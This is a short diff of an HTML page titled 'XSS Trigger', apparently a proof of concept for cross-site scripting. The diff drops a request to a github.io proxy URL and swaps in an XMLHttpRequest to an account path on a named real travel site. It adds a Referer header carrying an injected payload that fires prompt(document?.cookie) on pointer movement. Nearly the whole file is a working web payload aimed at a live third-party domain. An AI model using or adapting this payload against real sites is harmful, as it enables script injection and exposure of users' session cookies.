@@ -4,13 +4,13 @@
     <title>XSS Trigger</title>
 </head>
 <body>
-    <a href="#" id="xssLink">Click me</a>
+    <a href="javascript:void(0);" id="xssLink">Click me</a>
 
     <script>
     document.getElementById("xssLink").addEventListener("click", function() {
-        var url = "https://foysal1197.github.io/xss-poc/proxy.php"; // Update with your server's URL
         var xhr = new XMLHttpRequest();
-        xhr.open("GET", url, true);
+        xhr.open("GET", "https://travelpirates.hometogo.com/account/><", true);
+        xhr.setRequestHeader("Referer", 'tester90?><>><<x12 only=xxxxx onpointermove=prompt(document?.cookie)>hover-here-for-xss');
         xhr.send();
     });
     </script>
